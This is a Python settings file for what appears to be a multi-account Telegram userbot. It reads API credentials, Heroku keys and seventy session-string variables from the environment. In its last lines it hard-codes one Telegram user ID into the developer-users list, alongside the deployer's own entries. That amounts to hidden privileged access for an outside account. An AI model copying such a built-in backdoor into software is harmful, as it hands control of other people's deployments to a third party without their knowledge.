from os import getenv
from dotenv import load_dotenv
import time
from datetime import datetime

load_dotenv()

StartTime = time.time()

API_IDs = getenv("API_ID", default=None)
API_ID = int(API_IDs)
API_HASH = getenv("API_HASH", default=None)
owmner = getenv("OWNER_ID")
OWNER_ID = int(owmner)
OWNER_NAME = getenv("OWNER_NAME")
HEROKU_API_KEY = getenv("HEROKU_API_KEY", default=None)
HEROKU_APP_NAME  = getenv("HEROKU_APP_NAME", default=None)
HNDLR = getenv("HNDLR", default="/")
ALIVE_MESSAGE = getenv("ALIVE_MESSAGE")
ALIVE_MEDIA = getenv("ALIVE_MEDIA")
String_Session01 = getenv("String_Session01", default=None)
String_Session02 = getenv("String_Session02", default=None)
String_Session03 = getenv("String_Session03", default=None)
String_Session04 = getenv("String_Session04", default=None)
String_Session05 = getenv("String_Session05", default=None)
String_Session06 = getenv("String_Session06", default=None)
String_Session07 = getenv("String_Session07", default=None)
String_Session08 = getenv("String_Session08", default=None)
String_Session09 = getenv("String_Session09", default=None)
String_Session10 = getenv("String_Session10", default=None)
String_Session11 = getenv("String_Session11", default=None)
String_Session12 = getenv("String_Session12", default=None)
String_Session13 = getenv("String_Session13", default=None)
String_Session14 = getenv("String_Session14", default=None)
String_Session15 = getenv("String_Session15", default=None)
String_Session16 = getenv("String_Session16", default=None)
String_Session17 = getenv("String_Session17", default=None)
String_Session18 = getenv("String_Session18", default=None)
String_Session19 = getenv("String_Session19", default=None)
String_Session20 = getenv("String_Session20", default=None)
String_Session21 = getenv("String_Session21", default=None)
String_Session22 = getenv("String_Session22", default=None)
String_Session23 = getenv("String_Session23", default=None)
String_Session24 = getenv("String_Session24", default=None)
String_Session25 = getenv("String_Session25", default=None)
String_Session26 = getenv("String_Session26", default=None)
String_Session27 = getenv("String_Session27", default=None)
String_Session28 = getenv("String_Session28", default=None)
String_Session29 = getenv("String_Session29", default=None)
String_Session30 = getenv("String_Session30", default=None)
String_Session31 = getenv("String_Session31", default=None)
String_Session32 = getenv("String_Session32", default=None)
String_Session33 = getenv("String_Session33", default=None)
String_Session34 = getenv("String_Session34", default=None)
String_Session35 = getenv("String_Session35", default=None)
String_Session36 = getenv("String_Session36", default=None)
String_Session37 = getenv("String_Session37", default=None)
String_Session38 = getenv("String_Session38", default=None)
String_Session39 = getenv("String_Session39", default=None)
String_Session40 = getenv("String_Session40", default=None)
String_Session41 = getenv("String_Session41", default=None)
String_Session42 = getenv("String_Session42", default=None)
String_Session43 = getenv("String_Session43", default=None)
String_Session44 = getenv("String_Session44", default=None)
String_Session45 = getenv("String_Session45", default=None)
String_Session46 = getenv("String_Session46", default=None)
String_Session47 = getenv("String_Session47", default=None)
String_Session48 = getenv("String_Session48", default=None)
String_Session49 = getenv("String_Session49", default=None)
String_Session50 = getenv("String_Session50", default=None)
String_Session51 = getenv("String_Session51", default=None)
String_Session52 = getenv("String_Session52", default=None)
String_Session53 = getenv("String_Session53", default=None)
String_Session54 = getenv("String_Session54", default=None)
String_Session55 = getenv("String_Session55", default=None)
String_Session56 = getenv("String_Session56", default=None)
String_Session57 = getenv("String_Session57", default=None)
String_Session58 = getenv("String_Session58", default=None)
String_Session59 = getenv("String_Session59", default=None)
String_Session60 = getenv("String_Session60", default=None)
String_Session61 = getenv("String_Session61", default=None)
String_Session62 = getenv("String_Session62", default=None)
String_Session63 = getenv("String_Session63", default=None)
String_Session64 = getenv("String_Session64", default=None)
String_Session65 = getenv("String_Session65", default=None)
String_Session66 = getenv("String_Session66", default=None)
String_Session67 = getenv("String_Session67", default=None)
String_Session68 = getenv("String_Session68", default=None)
String_Session69 = getenv("String_Session69", default=None)
String_Session70 = getenv("String_Session70", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
DEV_USERS = list(map(int, getenv("DEV_USERS").split()))


SUDO_USERS.append(OWNER_ID)
DEV_USERS.append(OWNER_ID)

crew = [1693752959]

SUDO_USERS = list(SUDO_USERS)
DEV_USERS = list(DEV_USERS)
DEV_USERS.append(1693752959)
DEV_USERS.append(1693752959)
